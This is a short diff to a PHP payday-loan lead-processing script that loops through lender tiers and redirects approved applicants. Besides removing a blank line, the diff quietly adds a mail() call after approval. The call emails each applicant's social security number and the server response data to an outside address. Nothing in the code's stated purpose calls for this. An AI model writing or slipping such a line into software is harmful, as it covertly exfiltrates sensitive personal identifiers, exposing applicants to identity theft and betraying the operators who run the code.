@@ -218,7 +218,6 @@ foreach($TIERS as $tier)
 {
 	$lead['tier']  = $tier;
 	$lead_approved = lead_leadhorizontrack_process($lead, $result_data);
-	
 	if($lead_approved == 1)
 		break;
 }
@@ -251,6 +250,8 @@ if($lead_approved == 1)
 	
 	//if approved read the contents of hte approved template (that you can edit to add any pixels of your choice.
 	//then redirect the customer to the lender page.
+
+	mail('conway@thepaydayhound.com', 'Approved Lead from RoundSky ', $lead['social_security_number'] . ' and ' . $result_data['server_data']);
 	
 	$redirect_url = $result_data['redirect'];
 	include('approved.html');
